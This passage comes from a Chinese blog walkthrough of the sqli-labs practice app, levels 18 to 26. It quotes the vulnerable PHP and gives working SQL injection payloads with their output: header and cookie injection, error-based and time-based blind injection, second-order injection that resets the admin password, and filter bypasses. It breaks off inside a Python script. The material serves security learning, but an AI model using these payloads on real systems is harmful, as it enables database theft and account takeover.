c, &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">拼接后</span></span><br><span class="line"><span class="string">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>aaa<span class="string">&#x27;or extractvalue(1, concat(0x7e,(database()),0x7e)), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><p>2、时间盲注，仅展示库名长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="number">0</span>&amp;submit=Submit</span><br><span class="line">User-Agent: aaa<span class="string">&#x27;or if(length(database()=8),sleep(3),1), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">拼接后</span></span><br><span class="line"><span class="string">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>aaa<span class="string">&#x27;or if(length(database()=8),sleep(3),1), &#x27;</span><span class="number">123</span><span class="string">&#x27;,&#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">回显</span><br><span class="line">慢了三秒</span><br></pre></td></tr></table></figure><h3 id="level-19"><a href="#level-19" class="headerlink" title="level-19"></a>level-19</h3><p><strong>请求头（Referer）-注入-报错&#x2F;时间注入</strong><br>查看后端代码，类似level-18，只不过换了变量<br>仅展示extractvalue，其余一样，即<code>Referer: a&#39;or PAYLOAD, &#39;123&#39;)#</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=admin&amp;passwd=<span class="number">0</span>&amp;submit=Submit</span><br><span class="line">Referer: a<span class="string">&#x27;or extractvalue(1, concat(0x7e,(database()),0x7e)), &#x27;</span><span class="number">123</span><span class="string">&#x27;)#</span></span><br><span class="line"><span class="string">拼接后</span></span><br><span class="line"><span class="string">INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;</span>a<span class="string">&#x27;or extractvalue(1, concat(0x7e,(database()),0x7e)), &#x27;</span><span class="number">123</span><span class="string">&#x27;)#&#x27;</span>, <span class="string">&#x27;192.168.8.107&#x27;</span>)</span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="level-20"><a href="#level-20" class="headerlink" title="level-20"></a>level-20</h3><p><strong>请求头（cookie）-简单跳转-注入</strong><br>这里直接burp抓包，发现两次请求，第一次为POST，第二次为GET<br><img src="/2022/02/17/sqli-labs/2022-02-21-23-05-39.png"><br>重复第一次POST并不能获得有效价值回显，第二次GET才有<br>查看后端代码，得到关键代码，第一次登陆设置cookie，后面GET请求只需要cookie，并设置cookie寿命</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>]))<span class="comment">#为真则设置cookie，为假直接进入显示界面</span></span><br><span class="line">    &#123;</span><br><span class="line">    ---</span><br><span class="line">        <span class="variable">$cookee</span> = <span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);<span class="comment">#设置cookie</span></span><br><span class="line">            <span class="title function_ invoke__">header</span> (<span class="string">&#x27;Location: index.php&#x27;</span>);<span class="comment">#跳转，也就是在这里POST变成了GET</span></span><br><span class="line">    ---</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    ---</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;<span class="comment">#利用语句</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    ---</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以可利用点在于伪造GET请求的cookie,从上面利用语句可以看出很简单<br>仅测试库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">爆字段数</span><br><span class="line">    Cookie: uname=admin<span class="string">&#x27; order by 3#</span></span><br><span class="line"><span class="string">    后端拼接后</span></span><br><span class="line"><span class="string">    &gt;SELECT * FROM users WHERE username=&#x27;</span>admin<span class="string">&#x27; order by 3#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    回显正常</span><br><span class="line">    得字段数为<span class="number">3</span></span><br><span class="line">爆库名</span><br><span class="line">    GET data</span><br><span class="line">    Cookie: uname=-admin<span class="string">&#x27; union select 1,2,3#</span></span><br><span class="line"><span class="string">    后端拼接后</span></span><br><span class="line"><span class="string">    &gt;SELECT * FROM users WHERE username=&#x27;</span>-admin<span class="string">&#x27; union select 1,2,3#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    回显</span><br><span class="line">    Your Login name:<span class="number">2</span> Your Password:<span class="number">3</span> Your ID:<span class="number">1</span> //<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>都可以利用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    GET data</span><br><span class="line">    Cookie: uname=-admin<span class="string">&#x27; union select 1,2,database()#</span></span><br><span class="line"><span class="string">    回显</span></span><br><span class="line"><span class="string">    Your Password:security</span></span><br></pre></td></tr></table></figure><h3 id="level-21"><a href="#level-21" class="headerlink" title="level-21"></a>level-21</h3><p><strong>请求头（cookie）-简单跳转base64-单引号-单括号-注入</strong><br>原理类似于level-20，不过加了单引号单括号，虽然cookie存储时 base64加密了，但是sql查询时又解了<br>查看正常包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /sqli-labs/Less-<span class="number">21</span>/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">72.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">72.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://<span class="number">192.168</span><span class="number">.8</span><span class="number">.107</span>/sqli-labs/Less-<span class="number">21</span>/</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: uname=YWRtaW4%3D 这里base64加密了</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>关键代码还是差不多，我只需要把cookie对应加密一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure><p>直接测试库名，前后都不展开了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原语句</span><br><span class="line">-admin<span class="string">&#x27;) union select 1,2,database()#</span></span><br><span class="line"><span class="string">GET data</span></span><br><span class="line"><span class="string">Cookie: uname=-admin&#x27;</span>) union select <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">#</span></span><br><span class="line">拼接后</span><br><span class="line">SELECT * FROM users WHERE username=(<span class="string">&#x27;=-admin&#x27;</span>) union select <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">#&#x27;)</span></span><br><span class="line">回显</span><br><span class="line">&gt;Your Login name:<span class="number">2</span> Your Password:security Your ID:<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="level-22"><a href="#level-22" class="headerlink" title="level-22"></a>level-22</h3><p><strong>请求头（cookie）-简单跳转base64-双引号-注入</strong><br>代码基本没变，只是再解密后，加了双引号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$cookee</span>);</span><br><span class="line"><span class="variable">$cookee1</span> = <span class="string">&#x27;&quot;&#x27;</span>. <span class="variable">$cookee</span>. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=<span class="subst">$cookee1</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>直接测试库名，前后都不展开了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原语句</span><br><span class="line">uname=-admin<span class="string">&quot; union select 1,2,database()#</span></span><br><span class="line"><span class="string">GET data</span></span><br><span class="line"><span class="string">Cookie: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj</span></span><br><span class="line"><span class="string">拼接后</span></span><br><span class="line"><span class="string">&gt;SELECT * FROM users WHERE username=&quot;</span>-admin<span class="string">&quot; union select 1,2,database()#&quot;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">&gt;Your Login name:<span class="number">2</span> Your Password:security Your ID:<span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>参考：</strong><br><a href="https://www.cnblogs.com/du892294464/p/6835277.html">php中实现页面跳转的几种方式</a></p><h2 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h2><h3 id="level-23"><a href="#level-23" class="headerlink" title="level-23"></a>level-23</h3><p><strong>字段回显-过滤（注释过滤）-简单&#x2F;报错注入</strong><br>简单输入,判断单引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br></pre></td></tr></table></figure><p>后端关键代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">过滤 <span class="comment"># --</span></span><br><span class="line">    $reg = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line">    $reg1 = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line">    $replace = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    $<span class="built_in">id</span> = preg_replace($reg, $replace, $<span class="built_in">id</span>);</span><br><span class="line">    $<span class="built_in">id</span> = preg_replace($reg1, $replace, $<span class="built_in">id</span>);</span><br><span class="line">查询语句</span><br><span class="line">    $sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>所以就是换个方式达到注释得目的，或者让语句换种方式闭合可执行</p><p>1、<code>;%00</code>隔断<br>类似于%23&#x3D;#，%00在后端被转义后是个空白符，结合分号 ‘<code>;</code>’ sql语句读到这里就认后面没有了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;  or 1 ;%00</span></span><br><span class="line"><span class="string">后端处理后</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=&#x27;</span>-<span class="number">1</span><span class="string">&#x27; or 1;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span> 这里‘;’后面是有一个acsii为<span class="number">0x00</span>的字符，发挥隔断的作用</span><br><span class="line"></span><br><span class="line">爆字段数</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; order by 4  ;%00</span></span><br><span class="line"><span class="string">爆库名</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-23/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,database() ;%<span class="number">00</span></span><br></pre></td></tr></table></figure><p>2、闭合语句，利用报错<br>前面说过，报错语句放在参数位，这里只使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">floor</span><br><span class="line">    GET data</span><br><span class="line">    http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or  (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a) or &#x27;</span></span><br><span class="line">    后端处理后</span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> (select <span class="number">1</span> <span class="keyword">from</span> (select count(*),concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>,floor (rand(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables group by x)a) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    回显</span><br><span class="line">    Duplicate entry <span class="string">&#x27;~security~1&#x27;</span> <span class="keyword">for</span> key <span class="string">&#x27;group_key&#x27;</span></span><br><span class="line">updatexml</span><br><span class="line">    GET data</span><br><span class="line">    http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or  updatexml(1,concat(0x7e,(database()),0x7e),1) or &#x27;</span></span><br><span class="line">    后端处理后</span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    回显</span><br><span class="line">    XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br><span class="line">extractvalue </span><br><span class="line">    GET data</span><br><span class="line">    http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;  or extractvalue(1, concat(0x7e,(database()),0x7e))  or &#x27;</span></span><br><span class="line">    后端处理后</span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>)) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    回显</span><br><span class="line">    XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可以单纯利用闭合，这里都可以发挥自己的想象力了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">    http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">23</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;  union select 1,database(),3 or &#x27;</span></span><br><span class="line">后端处理后</span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1&#x27;</span> union select <span class="number">1</span>,database(),<span class="number">3</span> <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">    Your Login name:security</span><br><span class="line">    Your Password:<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="level-24"><a href="#level-24" class="headerlink" title="level-24"></a>level-24</h3><p><strong>未检验用户名-简单二次注入</strong><br>漏洞逻辑是登录&#x2F;注册都转义了，但是在更改密码时没有。<br>pass_change.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];<span class="comment">#未转义，造成漏洞</span></span><br><span class="line"><span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line"><span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以就使用<code>username</code>注入<br>这里使用报错注入，之前说过，放在参数为即可<br>如果我们想修改<code>admin</code>的密码<br>新建用户 <code>admin&#39;#</code> 密码<code>123 </code><br>然后更改<code>admin&#39;#</code> 的密码 为345，后端代码如下，可以看出，我们把<code>admin</code>的密码改成了<code>345</code>,也就是可以利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">&#x27;345&#x27;</span> where username=<span class="string">&#x27;admin&#x27;</span><span class="comment">#&#x27; and password=&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure><p>也可以拼接成其他的sql语句，但是后端username限制长度20，发挥空间也不是很大</p><h3 id="level-25"><a href="#level-25" class="headerlink" title="level-25"></a>level-25</h3><p><strong>过滤or&#x2F;and-单引号-简单注入</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码可以双写绕过<br>简单测试，不展开了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">爆字段</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">25</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; oorrder by 4%23</span></span><br><span class="line"><span class="string">爆库名</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-25/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,database()%<span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="level-25a"><a href="#level-25a" class="headerlink" title="level-25a"></a>level-25a</h3><p><strong>过滤or&#x2F;and-时间盲注</strong><br>因为没有报错信息，只能时间盲注，和level-25类似，不细致展开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-25a/?<span class="built_in">id</span>=<span class="number">1</span> oorr <span class="keyword">if</span>(length(database())=<span class="number">8</span>,sleep(<span class="number">3</span>),<span class="number">1</span>) %<span class="number">23</span></span><br></pre></td></tr></table></figure><h3 id="level-26"><a href="#level-26" class="headerlink" title="level-26"></a>level-26</h3><p><strong>过滤-报错注入</strong><br>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (大小写不敏感)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out 空格</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out /\</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题在于空格怎么绕过，可以用%a0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data </span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">26</span>/?<span class="built_in">id</span>=<span class="number">1</span>%<span class="number">27</span>%a0oorr%a0updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)%a0oorr%<span class="number">20</span>%<span class="number">27</span></span><br><span class="line"></span><br><span class="line">后端处理后</span><br><span class="line">SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;1&#x27;</span>�<span class="keyword">or</span>�updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">1</span>)�o<span class="string">r&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~security~&#x27;</span></span><br></pre></td></tr></table></figure><p>测试可以替代空格的字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span 